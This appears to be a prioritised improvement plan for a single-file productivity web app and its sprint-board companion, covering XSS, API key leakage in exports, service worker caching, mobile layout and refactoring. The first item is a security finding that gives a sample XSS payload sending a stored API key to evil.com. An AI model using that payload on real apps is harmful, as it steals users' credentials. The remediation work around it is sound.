# Task OS / Givelink — Improvement Plan

> Generated: 2026-06-18 | Codebase: index.html (12,893 lines), givelink.html (1,755 lines), sw.js (109 lines)

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

---

### 1. XSS in primary task/goal card rendering — `tcHTML`, `inboxHTML`, `goalHTML`

**What**: Task titles, goal titles, and goal descriptions are interpolated directly into `innerHTML` without `esc()`, making the app vulnerable to stored XSS via imported backup files.

**Where**: `index.html`
- Line 2694 — `inboxHTML`: `<div class="tt">${t.title}</div>`
- Line 2864 — `goalHTML`: `<div …>${g.title}</div>`
- Line 2865 — `goalHTML`: `<div …>${g.description}</div>`
- Line 3006 — `tcHTML`: `<div class="tt">${t.title}…`
- Line 3014 — `tcHTML`: `↳ ${gl.title.slice(0,20)}`

**Why it matters**: The `importData()` function (`index.html` line 2115) loads arbitrary JSON files. A malicious backup shared between users (e.g. on Discord, email) with a crafted task title like `<img src=x onerror="fetch('https://evil.com/?k='+encodeURIComponent(JSON.parse(localStorage.getItem('taskos')).claudeKey))">` would silently exfiltrate the Claude API key on import. The `esc()` helper already exists at line 9773 and is used correctly in search (lines 2346–2361) and `ifThen` display (line 3016) — it just needs to be applied consistently.

**Effort**: S

**Suggested fix**:
- In `tcHTML` (line 3006): `${esc(t.title)}` and line 3014: `${esc(gl.title.slice(0,20))}`
- In `inboxHTML` (line 2694): `${esc(t.title)}`
- In `goalHTML` (lines 2864–2865): `${esc(g.title)}` and `${esc(g.description)}`
- Audit `renderWizPanel` steps 0, 2, 3 (lines 2888, 2895, 2897) where `t.title` and `g.title` also appear unescaped

---

### 2. Push notification icon references a missing file

**What**: The service worker specifies `./icons/icon-192.png` for push notification icons — a path that doesn't exist in the repository.

**Where**: `sw.js` lines 38–39
```js
icon:'./icons/icon-192.png',
badge:'./icons/icon-192.png',
```

**Why it matters**: Any user who has enabled push reminders (via ntfy or direct push) sees a broken placeholder icon on every notification, undermining trust in the feature. On iOS, a missing badge can suppress the notification entirely.

**Effort**: S

**Suggested fix**:
- Change both paths to `'./icon.svg'` (the existing Task OS icon)
- For `badge`, use `'./icon.svg'` or omit it (browsers accept SVG icons for notifications)
- Optional: add a 192×192 PNG during a future assets pass and update the manifests too

---

### 3. New task modal defaults to 'givelink' category for all users

**What**: `openAdd()` hardcodes `document.getElementById('t-cat').value='givelink'`, so every new task pre-selects the Givelink category regardless of context.

**Where**: `index.html` line 3031

**Why it matters**: For the core personal productivity use case, every task the user creates requires an extra click to change category. This is the highest-frequency action in the app — any friction here compounds across hundreds of captures per week.

**Effort**: S

**Suggested fix**:
- Change the default from `'givelink'` to `'other'` (the genuinely neutral fallback)
- Optionally, remember the last-used category in `sessionStorage` and restore it here
- If `openAdd` is called from a Givelink context (e.g. the Givelink dash "Add Task" button already passes `goalId` for a Givelink goal), set category to 'givelink' only then

---

### 4. Givelink CRM kanban: 6-column grid with no mobile breakpoint

**What**: The CRM pipeline view uses `grid-template-columns:repeat(6,1fr)` with only `overflow-x:auto` as a concession to narrow screens — the six columns shrink to unusable slivers (~45px each) on phones.

**Where**: `givelink.html` line 197
```css
.crm-kanban{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;overflow-x:auto;}
```
The `@media(max-width:768px)` block (lines 155–175) has no `.crm-kanban` override.

**Why it matters**: The CRM is a core Givelink workflow for tracking nonprofit pipeline deals. Anyone reviewing pipeline on a phone (e.g. after a pitch meeting) sees a horizontal-scrolling micro-grid that's impossible to interact with.

**Effort**: S

**Suggested fix**:
- Add to the `@media(max-width:768px)` block: `.crm-kanban{grid-template-columns:1fr;}`
- Each stage stacks vertically on mobile; use a stage heading to label each section
- Optionally add a `min-width:140px` on columns and let the grid scroll horizontally only when there are genuinely too many stages to fit

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

---

### 5. Givelink accent color is off-brand blue instead of brand purple

**What**: `givelink.html` declares `--accent:#3b82f6` (Tailwind blue-500). All active nav indicators, links, button borders, sprint-bar labels, and focus rings display blue — not the Givelink brand purple.

**Where**: `givelink.html` line 17
```css
--accent:#3b82f6;
```

**Why it matters**: Every touchpoint in the Givelink sprint board reads as a generic developer tool. Brand purple (`#5718CA`) on the dark navy background (`#070d1a`) creates strong contrast and signals a distinct, intentional product identity. The `theme-color` meta tag (line 6) also uses `#3b82f6`, so the browser chrome on Android PWA installs is blue.

**Effort**: S

**Suggested fix**:
- Change `--accent` to `#5718CA` (or `#7C3AED` for slightly softer purple at this dark bg)
- Update `<meta name="theme-color" content="#3b82f6">` (line 6) to match
- Update `manifest-givelink.json` `theme_color` field from `"#3b82f6"` to `"#5718CA"`
- Verify contrast ratio ≥ 4.5:1 against `--sf:#0e1628` (it is: ~7.2:1 for `#7C3AED` on `#0e1628`)

---

### 6. Claude API key silently included in every data export

**What**: `S.claudeKey` is part of the state object and therefore included in every JSON export via `exportData()` and `exportFullJSON()`. Users who share backups (or store them in Dropbox/iCloud) unknowingly share their API key.

**Where**: `index.html`
- Line 2036 — `claudeKey:''` in state definition
- Line 2108 — `exportData()` exports `S` in full
- Line 4138 — `x-api-key: S.claudeKey` in Claude fetch call

**Why it matters**: Claude API keys have real monetary cost. A leaked key gets rate-limited or billed unexpectedly. Supabase sync also serializes `S`, meaning the key travels to the remote DB row.

**Effort**: S

**Suggested fix**:
- In `exportData()` and `exportFullJSON()`, redact the key before export: `const out={...S,claudeKey:''};`
- Add a one-time warning banner in the Settings → AI section: "Your API key is stored in your browser only and never leaves this device, but will not be included in exports."
- Consider storing `claudeKey` in a separate `localStorage` key outside of `S` so it's never accidentally serialized

---

### 7. Service worker cache version is a hardcoded date — stale PWA on every deploy

**What**: `CACHE='task-os-20260530'` means the service worker never invalidates the cached HTML on new deploys unless the developer manually bumps this string.

**Where**: `sw.js` line 1

**Why it matters**: PWA users who installed the app before a deploy keep running the old version until they manually clear storage or force-refresh. Since Vercel sets `Cache-Control: no-cache, must-revalidate` on HTML, this only affects the service worker path — but that's the path for users who added to home screen. Silent stale versions erode trust when bugs "keep coming back."

**Effort**: S

**Suggested fix**:
- Replace the hardcoded date with a dynamic approach: add a cache-busting comment in the SW that must be changed on deploy (low effort), or
- Include a `/version` endpoint or meta tag in `index.html` and have the SW compare versions on activate (medium effort)
- Minimum viable fix: document in `README.md` that `sw.js` line 1 must be bumped on every deploy, and add a comment in the file itself

---

### 8. New task modal (`openAdd`) doesn't auto-focus the title field

**What**: When `openAdd()` opens the task creation modal, no element is focused. The user must click the title input field before typing.

**Where**: `index.html` lines 3027–3050 (`openAdd` function) — no `focus()` call after modal render

**Why it matters**: Quick capture is the most frequent action in the app (keyboard shortcut `N`, FAB button). A single extra click per task adds up to significant friction for power users targeting Inbox Zero. The global search already handles this correctly (`openGlobalSearch` focuses the input on open).

**Effort**: S

**Suggested fix**:
- At the end of `openAdd()`, after `showM('task-modal')`, add:
  ```js
  setTimeout(()=>document.getElementById('t-title')?.focus(), 50);
  ```
- Apply the same fix to `openAdd` variants like `openAddGoal`, `openAddBook`, and `openHabitSettings`

---

### 9. Confirm and prompt modals have no focus trap

**What**: `showConfirm()` and `showPrompt()` (lines 2290, 2303) open modal dialogs but don't trap keyboard focus. Tab key cycles through elements behind the modal.

**Where**: `index.html` lines 2290–2320

**Why it matters**: Keyboard-only users (accessibility need) and power users relying on keyboard shortcuts can accidentally trigger actions through the modal backdrop. Specifically, pressing Tab in the confirm modal and then Enter could activate a button behind it.

**Effort**: M

**Suggested fix**:
- On modal open, collect all focusable elements within the `.mo` container; on Tab keydown, cycle only within those elements
- Return focus to the triggering element on modal close
- The existing `_focusTrap` utility may already exist (check around line 2288); if so, wire it up to `showConfirm`/`showPrompt`

---

### 10. Hardcoded financial targets (€25K, €3.6K) are non-configurable

**What**: Income and passive income progress bars are calculated against hardcoded targets: `income:25000` and `passive:3600` in two separate places plus a third direct reference.

**Where**: `index.html` lines 2852, 4299, 5139
```js
const targets={income:25000,passive:3600};
// and line 4299:
`Income ${yr} (goal: €25K)`
```

**Why it matters**: These targets are personal to one user. Anyone else using the finance view sees progress bars calculated against someone else's goals and a hardcoded label "goal: €25K." This makes the feature unusable and misleading for any user who isn't targeting exactly these numbers.

**Effort**: S

**Suggested fix**:
- Add `financeTargets:{income:25000,passive:3600}` to state `S` (line 2036)
- Replace all three hardcoded references with `S.financeTargets.income` / `S.financeTargets.passive`
- Expose editing fields in Settings → Finance section

---

## 🛠 P2 — Code health (tech debt slowing velocity)

---

### 11. `tcHTML` and `goalHTML` are 20+ line inline template functions in a 12,893-line file

**What**: The core rendering functions — which produce HTML for every task card and goal card displayed — live as dense, unindented template literals inside the monolithic `index.html`. Each function is 20–50 lines with nested ternary expressions and no comments.

**Where**: `index.html` lines 2999–3020 (`tcHTML`), 2831–2872 (`goalHTML`)

**Why it matters**: Any bug fix in how tasks render requires navigating a 12,893-line file, making diffs noisy and review difficult. The PR for commit `#54` modified only 10 lines but showed as a full-file diff. As features are added, render functions will grow further.

**Effort**: L

**Suggested fix**:
- Extract JS into a `taskos.js` file and load it via `<script src="taskos.js">` — no build tooling needed
- Start with the pure functions: `tcHTML`, `goalHTML`, `inboxHTML`, `_parseNLDate`, `calcLifeScore`, `esc`
- This alone cuts the inline JS by ~8,000 lines while keeping zero build dependencies

---

### 12. Zero unit tests for critical utility functions

**What**: `_parseNLDate`, `calcLifeScore`, `awardXP`, and `uid` have no test coverage. Three of the last five commits are bug fixes that could have been caught by tests.

**Where**: No test files exist anywhere in the repository.

**Why it matters**: `_parseNLDate` has already had edge-case bugs (commit `#54` fixed ladder crashes caused by similar field-name mismatches). A regression in natural language date parsing silently breaks the capture flow for all users. `calcLifeScore` drives the Life Score widget; a broken weight means users see wrong scores for weeks.

**Effort**: M

**Suggested fix**:
- Add a `tests/` directory with a single `test.html` file using a minimal assertion harness (no npm required)
- Start with 10 assertions for `_parseNLDate` (today, tomorrow, next week, "Friday", "in 3 days", edge: no date keyword)
- Add 5 assertions for `calcLifeScore` using fixed mock state objects
- Run via `open tests/test.html` locally; CI can use `npx serve . && npx puppeteer` or a lightweight GitHub Action

---

### 13. `renderView()` silently no-ops on unknown view names

**What**: `renderView(v)` uses optional chaining (`({...})[v]?.()`) so an invalid view name renders a blank screen with no console warning or user feedback.

**Where**: `index.html` line 2456

**Why it matters**: If a nav link ever points to a renamed or removed view (e.g. a typo in the 40+ `nav()` calls), the user lands on a blank, unlabelled white screen with no way to recover except refreshing. This is currently a latent risk as the view registry has grown to 40+ entries with no validation.

**Effort**: S

**Suggested fix**:
```js
function renderView(v){
  const fn=({...})[v];
  if(!fn){console.warn('Unknown view:',v);toast('⚠️ View not found: '+v);return;}
  fn();
}
```

---

### 14. `renderWizPanel` is a 300-line, 6-branch function

**What**: The weekly review wizard renders all six steps inside a single function with inline HTML templates for each step (lines 2882–3120). Each step's HTML is ~40–70 lines of template literals.

**Where**: `index.html` lines 2882–3120

**Why it matters**: The last two weekly review bugs (`#48`, `#54`) were in this section. The function is too large to safely edit — a misplaced brace or missing `esc()` affects all steps. Commit `#54` fixed a `t.title` display bug but left `g.title` still unescaped two steps later.

**Effort**: M

**Suggested fix**:
- Extract each step into a named function: `_wizStep0()`, `_wizStep1()`, etc.
- `renderWizPanel` becomes a 6-line dispatch: `[_wizStep0,…_wizStep5][wizStep]?.(body)`
- This makes each step independently testable and reviewable

---

### 15. `dashWidgetOrder` uses fragile string IDs with no validation or fallback

**What**: `dashWidgetOrder` (set in `S` at line 2036) controls dashboard widget arrangement via string IDs like `'lifescore'`, `'daily-picks'`. If a widget ID is renamed, it silently disappears from the user's dashboard with no error and no way to recover without clearing state.

**Where**: `index.html` line 2036 (state definition) and the dashboard render that consumes it

**Why it matters**: The widget order has already diverged from the default array (`['lifescore','daily-picks','daily-quests','habits','routines','deepwork','wheel-mini']`) which includes `'daily-picks'` — a name not obviously matching any rendered widget. Users who customized their dashboard may have a broken widget order after feature renames.

**Effort**: S

**Suggested fix**:
- On dashboard load, filter `dashWidgetOrder` against a `KNOWN_WIDGETS` constant and drop unknown IDs
- Add any known widgets not in the user's saved order to the end (handles new widgets added after user setup)

---

### 16. Claude API key exported in data backups

**What**: `exportData()` at line 2108 serializes `S` in full, including `S.claudeKey`. Users sharing backups unknowingly share their API key.

**Where**: `index.html` lines 2108–2113, 2156–2162

**Why it matters**: Claude API keys are billed per token. A leaked key in a shared backup file results in unexpected charges for the owner. This was already flagged in P1 (#6) from the UX angle; this entry is the code fix.

**Effort**: S

**Suggested fix**:
```js
function exportData(){
  const {claudeKey:_, ...exportable}=S;
  const blob=new Blob([JSON.stringify(exportable,null,2)],{type:'application/json'});
  // … rest unchanged
}
```
Apply same redaction to `exportFullJSON()`.

---

## 💡 P3 — Nice to have

---

### 17. AI output modal renders raw text — markdown formatting lost

**What**: `showAiOut()` at line 4152 uses `textContent` for the response body, so bullet points, bold text, and headers from Claude's markdown output render as `* item` and `**bold**` instead of formatted text.

**Where**: `index.html` lines 4150–4154

**Why it matters**: AI suggestions (task sequencing, goal coaching, weekly insights) are the premium feature differentiator. When they render as unformatted plain text with visible asterisks, the output looks lower quality than it is.

**Effort**: M

**Suggested fix**:
- Add a lightweight `_md2html(text)` converter (no library needed — 20 lines of regex for `**bold**`, `*item`, `## heading`, blank-line paragraphs)
- Use `innerHTML=_md2html(esc(text))` — escape first, then apply markup to prevent XSS
- Alternative: use a CSP-safe CDN-free markdown library like `marked` inlined as a minimal build

---

### 18. Givelink has no keyboard shortcuts or command palette

**What**: Task OS has `⌘K` command palette, documented shortcuts for every action, and full keyboard navigation. Givelink Sprint Board has none of these.

**Where**: `givelink.html` — no keyboard event listener for `⌘K` or documented shortcut sheet

**Why it matters**: Power users running standups from their laptop expect keyboard-first workflows. The absence of shortcuts makes the sprint board feel less polished than the main app and slows daily stand-up updates.

**Effort**: M

**Suggested fix**:
- Add at minimum: `N` → new task, `S` → new sprint, `Esc` → close modal, `1–5` → switch views
- Wire a `keydown` listener at page level (pattern already exists in `index.html` around line 3610)
- A `?` key → shortcuts modal takes 30 minutes and pays off immediately

---

### 19. `sw.js` push notification icon path references non-existent `/icons/` directory

Already covered in P0 item #2. This P3 note is about the broader icon gap:

**What**: `manifest.json` and `manifest-givelink.json` both declare only SVG icons with `"purpose":"any maskable"`. Maskable icons require specific padding; a regular SVG used as maskable may get clipped by OS safe-area masks.

**Where**: `manifest.json` lines 8–14, `manifest-givelink.json` lines 8–14

**Why it matters**: iOS and Android may clip the icon logo when displaying it on home screen, resulting in a cropped or oddly padded appearance.

**Effort**: S

**Suggested fix**:
- Generate PNG exports of `icon.svg` and `icon-gl.svg` at 192×192 and 512×512 with proper maskable padding (at least 10% on all sides)
- Add both `"purpose":"any"` and `"purpose":"maskable"` entries to the manifests

---

### 20. `_parseNLDate` doesn't handle timezone offsets for "today"

**What**: `addDays(0)` at line 2649 creates a date at noon local time but `toISOString()` converts to UTC. In UTC-12 (Baker Island), noon local = midnight UTC previous day. The user captures "tonight" and the task gets yesterday's date.

**Where**: `index.html` line 2649
```js
const addDays=n=>{const d=new Date(now);d.setHours(12,0,0,0);d.setDate(d.getDate()+n);return fmt(d);};
```

**Why it matters**: Affects users in extreme time zones (Hawaii UTC-10 is borderline; midnight local = 10:00 UTC next day which is fine in the other direction). Low probability but confusing when it happens.

**Effort**: S

**Suggested fix**:
- Replace `d.toISOString().slice(0,10)` with a local-date formatter:
  ```js
  const fmt=d=>`${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;
  ```
- This is the same fix needed in every place the app derives "today" for comparisons (habits, deep work, etc.)
